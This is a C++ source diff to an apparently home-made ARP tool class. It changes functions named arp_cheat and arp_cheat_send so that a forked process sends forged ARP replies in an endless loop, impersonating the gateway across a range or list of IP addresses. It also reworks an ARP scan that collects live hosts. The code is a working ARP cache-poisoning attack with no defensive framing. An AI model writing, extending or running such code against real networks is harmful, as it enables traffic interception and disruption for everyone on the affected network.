@@ -99,9 +99,11 @@ int mac_arp::arp_cheat_send(uint32_t start, uint32_t endad ) {//net sequence
         uint32_t t = (htonl(st));
         form_arp(&arp, local[local_conf_valid - 1].gate, t);
         if(send_arp(&mac, &arp) <= 0) break;
+        //sleep(0.01);
         st++;
         cnt++;
     }
+    printf("send once!\n");
     return cnt;
 }
 
@@ -159,14 +161,23 @@ uint32_t mac_arp::arp_cheat(uint32_t start, uint32_t endd) { //net sequence
     if (fpid < 0)
         perror("error in fork!");
     else if (fpid == 0) {//child
-        for (int i = 0; i < 2; i++) //send twice
+        while(1) {//
             arp_cheat_send(start, endd);
+            sleep(1);
+        }
+        exit(10);
+    } else {
+        while(1) {
+            uint32_t ne = arp_cheat_recv(start, endd);
+        }
+        int status;
+        wait(&status);
     }
-    while(1) {
-        uint32_t ne = arp_cheat_recv(start, endd);
-    }
-    int status;
-    wait(&status);
+}
+
+uint32_t mac_arp::arp_cheat(std::vector<uint32_t> &vec){
+    for (std::vector<uint32_t>::iterator i=vec.begin(); i!=vec.end(); i++)
+        arp_cheat(*i);
 }
 
 uint32_t mac_arp::arp_cheat(char *start, char *endsss) {
@@ -181,23 +192,39 @@ uint32_t mac_arp::arp_cheat(uint32_t ip) { //net sequence
     return arp_cheat(ip, ip);
 }
 
-int mac_arp::scan_ip_arp(uint32_t start, uint32_t endd, std::vector<uint32_t> &vec) { //net seq
+int mac_arp::scan_ip_arp(std::vector<uint32_t> &vec, uint32_t start, uint32_t endd) { //net seq
     pid_t fpid = fork();
     if (fpid < 0)
         perror("error in fork!");
     else if (fpid == 0) {//child
         for (int i = 0; i < 2; i++) //send twice
             arp_cheat_send(start, endd);
-    }
-    while(1) {
-        uint32_t ne = arp_cheat_recv(start, endd);
-        if (find(vec.begin(), vec.end(), ne) != vec.end()) {
-            vec.push_back(ne);
+        printf("scan done!wait for response!\n");
+        exit(0);
+    } else {//father
+        int sec_st = time((time_t*)NULL);
+        int sec_ed = sec_st;
+        int status;
+        while(1) {
+            uint32_t ne = arp_cheat_recv(start, endd);
+            if (find(vec.begin(), vec.end(), ne) == vec.end()) {
+                vec.push_back(ne);
+            }
+            // if (vec.size() >= 5) break;
+
+            if (!waitpid(fpid, NULL, WNOHANG)) {
+                sec_ed = time((time_t*)NULL);
+                continue;
+            } else {//has ended
+                int now = time((time_t*)NULL) - sec_ed;
+                if ( now > (sec_ed - sec_st) && now > 1) {
+                    break;
+                }
+            }
         }
-        if (vec.size() >= 1) break;
+        //wait(&status);
+        std::sort(vec.begin(), vec.end(), com_ip);//, std::mem_fun(&mac_arp::ip_com)
     }
-    int status;
-    wait(&status);
 }
 
 int mac_arp::scan_ip_arp(std::vector<uint32_t> &vec, char * start, char * endsss) { //net seq
@@ -205,7 +232,7 @@ int mac_arp::scan_ip_arp(std::vector<uint32_t> &vec, char * start, char * endsss
     if(start != NULL) st = inet_addr(start);
     if(endsss != NULL) ed = inet_addr(endsss);
 
-    return scan_ip_arp(st, ed, vec);
+    return scan_ip_arp( vec, st, ed);
 }
 
 void mac_arp::show_arp ( my_arp * arp ) {
